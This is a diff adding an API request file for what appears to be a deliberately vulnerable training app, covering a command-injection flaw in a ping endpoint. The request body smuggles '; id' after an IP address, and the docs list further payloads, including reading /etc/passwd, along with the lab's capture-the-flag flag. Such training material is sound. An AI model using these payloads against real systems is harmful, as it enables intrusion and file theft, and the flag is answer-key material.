@@ -1,0 +1,37 @@
+meta {
+  name: V07 CMDi - Ping with Command Injection
+  type: http
+  seq: 1
+}
+
+post {
+  url: {{baseUrl}}/api/tools/ping
+  body: json
+  auth: bearer
+}
+
+auth:bearer {
+  token: {{token}}
+}
+
+body:json {
+  {
+    "host": "127.0.0.1; id"
+  }
+}
+
+docs {
+  # V07: Command Injection - Ping
+
+  ## Vulnerability
+  Host parameter passed directly to shell command.
+
+  ## Exploit
+  Inject shell commands after semicolon:
+  - `127.0.0.1; id` - show current user
+  - `127.0.0.1; cat /etc/passwd` - read files
+  - `127.0.0.1; whoami` - show username
+
+  ## Flag
+  VULNAPI{cmd_injection_rce_achieved}
+}
